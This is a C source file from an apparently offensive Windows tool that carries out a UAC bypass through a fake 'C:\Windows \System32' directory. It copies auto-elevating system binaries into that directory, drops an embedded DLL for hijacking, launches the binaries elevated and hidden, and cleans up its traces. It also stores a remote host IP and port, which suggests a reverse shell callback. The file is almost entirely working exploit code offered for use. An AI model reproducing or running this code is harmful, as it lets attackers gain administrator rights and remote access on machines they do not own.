#include <windows.h>
#include <stdio.h>
#include <strsafe.h>

#include "tools.h"
#include "TargetDll.h"
#include "resource.h"
#include "Message.h"

BOOL CheckExploit(char* exeName, char* dllName) {
    BOOL result = FALSE;

    char* buffer = (char*)malloc(MAX_PATH);
    if (buffer != NULL) {
        const char* regKey = "Software\\Wincat";

        if (ReadRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "test", buffer, MAX_PATH)) {
            result = strcmp(buffer, "1") == 0;
            Sleep(1000);
            if (!RegDelnodeRecurse(HKEY_CURRENT_USER, (char*)regKey))
                printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to clear reg key: HKCU:%s\n", regKey);
        }
        free(buffer);
    }
    else
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory\n");
    return result;
};


BOOL CreateFakeDirectory() {
    const char* dir1 = "C:\\Windows \\";
    const char* dir2 = "C:\\Windows \\System32";

    if (!CreateDirectoryA(dir1, NULL)) {
        int lastError = GetLastError();
        if (lastError != ERROR_ALREADY_EXISTS) {
            printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to create directory: %s (%ld)\n", dir1, lastError);
            return FALSE;
        }
    }
    if (!CreateDirectoryA(dir2, NULL)) {
        int lastError = GetLastError();
        if (lastError != ERROR_ALREADY_EXISTS) {
            printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to create directory : % s(% ld)\n", dir2, lastError);
            return FALSE;
        }
    }
    return TRUE;
}

BOOL CopyExeFile(char* system32Path, char* fileName) {
    char* fullPathInt = (char*)malloc(MAX_PATH);
    if (fullPathInt == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory\n");
        return FALSE;
    }
    char* fullPathOut = (char*)malloc(MAX_PATH);
    if (fullPathOut == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory\n");
        free(fullPathInt);
        return FALSE;
    }
    sprintf_s(fullPathInt, MAX_PATH, "%s\\%s", system32Path, fileName);
    sprintf_s(fullPathOut, MAX_PATH, "C:\\Windows \\System32\\%s", fileName);
    if (!CopyFileA(fullPathInt, fullPathOut, FALSE)) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to copy file %s (%ld)\n", fullPathOut, GetLastError());
        free(fullPathOut);
        free(fullPathInt);
        return FALSE;
    }
    printMsg(STATUS_INFO, LEVEL_VERBOSE, "File copied: %s -> %s \n", fullPathInt, fullPathOut);

    free(fullPathOut);
    free(fullPathInt);
    return TRUE;
}
/*BOOL CopyDllFile(char* fileName, char* targetDll) {
    char* fullPathOut = (char*)malloc(MAX_PATH);
    if (fullPathOut == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory\n");
        return FALSE;
    }
    sprintf_s(fullPathOut, MAX_PATH, "C:\\Windows \\System32\\%s", fileName);
    if (!CopyFileA(targetDll, fullPathOut, FALSE)) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to copy file %s (%ld)\n", fullPathOut, GetLastError());
        free(fullPathOut);
        return FALSE;
    }
    printMsg(STATUS_INFO, LEVEL_DEFAULT, "File copied: %s -> %s \n", targetDll, fullPathOut);

    free(fullPathOut);
    return TRUE;
}*/
BOOL CopyDllFileResource(char* fileName, int resouceId, char* resouceName) {
    char* fullPathOut = (char*)malloc(MAX_PATH);
    HMODULE hMod;

    if (fullPathOut == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory\n");
        return FALSE;
    }
    sprintf_s(fullPathOut, MAX_PATH, "C:\\Windows \\System32\\%s", fileName);

    hMod = GetModuleHandleA(NULL);
    if (hMod != NULL) {
        HRSRC res = FindResourceA(hMod, MAKEINTRESOURCEA(resouceId), resouceName);
        if (res != NULL) {
            DWORD dllSize = SizeofResource(hMod, res);
            void* dllBuff = LoadResource(hMod, res);
            HANDLE hDll = CreateFileA(fullPathOut, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
            if (hDll != INVALID_HANDLE_VALUE) {
                DWORD sizeOut;
                WriteFile(hDll, dllBuff, dllSize, &sizeOut, NULL);
                CloseHandle(hDll);
                free(fullPathOut);
                printMsg(STATUS_INFO, LEVEL_DEFAULT, "File dropped: %s \n", fullPathOut);
                return TRUE;
            }
            else {
                int lastError = GetLastError();
                if (lastError != 32) { // ERROR_SHARING_VIOLATION -> ERROR_ALREADY_EXISTS
                    printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to create file: %s (%ld)\n", fullPathOut, lastError);
                    free(fullPathOut);
                    return FALSE;
                }
                else {
                    printMsg(STATUS_INFO, LEVEL_VERBOSE, "File already exists: %s \n", fullPathOut);
                }
            }
        }
        else
            printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to Find Resource: '%s' !\n", resouceName);
    }
    else
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to GetModuleHandleA !\n");
    free(fullPathOut);
    return FALSE;
}
BOOL Trigger(char* fileName) {
    SHELLEXECUTEINFOA sinfo = { 0 };

    char* fullPath = (char*)malloc(MAX_PATH);
    if (fullPath == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory\n");
        return FALSE;
    }
    sprintf_s(fullPath, MAX_PATH, "C:\\Windows \\System32\\%s", fileName);
    printMsg(STATUS_INFO, LEVEL_DEFAULT, "Triggering: %s\n", fullPath);

    sinfo.cbSize = sizeof(SHELLEXECUTEINFOA);
    sinfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    sinfo.hwnd = NULL;
    sinfo.lpVerb = "runas";
    sinfo.lpFile = fullPath;
    sinfo.lpParameters = NULL;
    sinfo.lpDirectory = "C:\\Windows \\System32\\";
    sinfo.nShow = SW_HIDE;
    sinfo.hInstApp = NULL;

    //SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
    SetErrorMode(SEM_FAILCRITICALERRORS |
        SEM_NOALIGNMENTFAULTEXCEPT |
        SEM_NOGPFAULTERRORBOX |
        SEM_NOOPENFILEERRORBOX);

    if (!ShellExecuteExA(&sinfo) || sinfo.hProcess == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to create process %ld\n", GetLastError());
        return FALSE;
    }
    if (WaitForSingleObject(sinfo.hProcess, 100) == WAIT_TIMEOUT) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Process create timout (%s).\n", fileName);
        if (!TerminateProcess(sinfo.hProcess, 1))
            printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Fail to terminate process (%s)!\n", fileName);
    }
    CloseHandle(sinfo.hProcess);

    free(fullPath);
    return TRUE;
}

BOOL RemoveFakeDirectory() {
    if (!RemoveDirectoryA("C:\\Windows \\System32")) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to remove directory %ld\n", GetLastError());
        return FALSE;
    }
    if (!RemoveDirectoryA("C:\\Windows \\")) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to remove directory %ld\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}
BOOL CleanUpFakeDirectory(char* exeName, char* dllName) {
    const char* system32FakePath = "C:\\Windows \\System32";

    char* bufferFilePath = (char*)malloc(MAX_PATH);
    if (bufferFilePath == NULL)
        return FALSE;

    sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", system32FakePath, exeName);
    if (!DeleteFileA(bufferFilePath))
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to delete file %s (%ld)\n", bufferFilePath, GetLastError());

    sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", system32FakePath, dllName);
    if (!DeleteFileA(bufferFilePath))
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to delete file %s (%ld)\n", bufferFilePath, GetLastError());
    free(bufferFilePath);
    return TRUE;
}
BOOL FullCleanUp() {
    const char* system32FakePath = "C:\\Windows \\System32";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA("C:\\Windows \\System32\\*.*", &fd);
    int iFailRemove = 0;

    if (hFind == INVALID_HANDLE_VALUE) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to find files in directory %s (%ld)\n", system32FakePath, GetLastError());
        return FALSE;
    }
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        char* bufferFilePath = (char*)malloc(MAX_PATH);
        if (bufferFilePath == NULL)
            return FALSE;
        sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", system32FakePath, fd.cFileName);
        if (!DeleteFileA(bufferFilePath)) {
            printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to delete file %s (%ld)\n", bufferFilePath, GetLastError());
            iFailRemove++;
        }
        free(bufferFilePath);
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
    if (iFailRemove > 0)
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to delete %i files (Need manual clean up)! \n", iFailRemove);
    RemoveFakeDirectory();
    return TRUE;
}
BOOL Exploit(char* exeName, char* dllName, char* system32Path) {
    CreateFakeDirectory();
    CopyExeFile(system32Path, exeName);
#if _WIN64
    CopyDllFileResource(dllName, IDR_DATA2, "DATA_64"); // 32 - 64 
#else
    CopyDllFileResource(dllName, IDR_DATA1, "DATA_32"); // 32 - 64 
#endif
    Trigger(exeName);
    Sleep(100);
    CleanUpFakeDirectory(exeName, dllName);
    return CheckExploit(exeName, dllName);
}

BOOL ExploitTrustedDirectories(char* PathExeToRun,WCHAR* UipAddress, char* port) {
    BOOL exploitSuccessed = FALSE;


    if (!SaveRHostInfo(UipAddress, port))
        return FALSE;

    char* system32Path = (char*)malloc(sizeof(char) * MAX_PATH);
    if (system32Path == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory\n");
        return TRUE;
    }
    if (!GetSystemDirectoryA(system32Path, MAX_PATH)) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to get system directory\n");
        free(system32Path);
        return TRUE;
    }
    printMsg(STATUS_OK, LEVEL_DEFAULT, "System directory: '%s'\n", system32Path);
    printMsg(STATUS_OK, LEVEL_DEFAULT, "System fake directory: 'c:\\WINDOWS \\system32'\n\n");

    if (!SaveCPathInfo(PathExeToRun)) {
        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save info in reg !\n");
        return FALSE;
    }

    printf("[+] Running exploit:\n");
    for (int i = 0; i < sizeof(dllList) / sizeof(DllList) && !exploitSuccessed; i++) {
        for (int j = 0; j < dllList[i].tableSize && !exploitSuccessed; j++) {
            printMsg(STATUS_OK2, LEVEL_DEFAULT, "Target: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
            if (Exploit((char*)dllList[i].name, (char*)dllList[i].dllTable[j], system32Path)) {
                printMsg(STATUS_OK2, LEVEL_DEFAULT, "Vulnerable: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
                exploitSuccessed = TRUE;
            }
        }
    }
    FullCleanUp();
    free(system32Path);
    return exploitSuccessed;
}